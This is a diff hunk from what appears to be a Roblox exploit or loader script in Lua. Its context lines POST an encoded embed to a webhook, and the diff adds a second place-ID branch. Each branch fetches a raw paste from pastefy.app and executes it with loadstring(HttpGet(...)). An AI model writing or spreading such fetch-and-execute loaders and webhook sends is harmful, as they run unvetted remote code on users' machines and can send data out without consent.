@@ -151,6 +151,9 @@ task.spawn(function()
     local payload = HttpService:JSONEncode({["embeds"] = {embed}})
     request({Url = WebhookURL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = payload})
 end)
-if game.PlaceId == 137303692488494 then
+local placeId = game.PlaceId
+if placeId == 137303692488494 then
     loadstring(game:HttpGet("https://pastefy.app/j4AoygTs/raw"))()
+elseif placeId == 105352590834997 then
+    loadstring(game:HttpGet("https://pastefy.app/BIRvMKPF/raw"))()
 end
